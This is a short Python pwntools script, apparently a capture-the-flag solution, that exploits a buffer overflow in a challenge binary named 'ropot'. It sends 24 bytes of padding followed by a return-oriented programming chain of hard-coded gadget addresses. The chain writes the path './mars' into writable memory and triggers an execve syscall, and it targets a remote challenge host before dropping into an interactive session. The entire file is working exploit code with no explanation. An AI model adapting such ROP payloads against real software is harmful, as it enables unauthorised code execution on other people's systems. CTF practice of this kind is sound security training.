from pwn import *

elf = ELF('./ropot')

local = False

padding = b'A'*24

popRdi = p64(0x4018ea)
popRsi = p64(0x40f6be)
popRdx = p64(0x4017ef)
popRbx = p64(0x40225b)
popRax = p64(0x459e97)

writeGadget = p64(0x428838)

syscallGadget = p64(0x4012e3)

payload = padding

payload += popRax
payload += b'./mars\x00\x00'
payload += popRdx
payload += p64(0x4e1bc0) #address for writable memory
payload += writeGadget

payload += popRax
payload += p64(0x3b)
payload += popRdi
payload += p64(0x4e1bc0) #address for writable memory
payload += popRsi
payload += p64(0)
payload += popRdx
payload += p64(0)
    
payload += syscallGadget

print(len(payload))

if local:
    p = elf.process() 
    
    p.sendline(payload)

else:
    host = 'ropot.is.hackthe.space'
    port = 65428
    
    p = remote(host,port)
    p.sendline(payload)

print(p.recv())
p.interactive()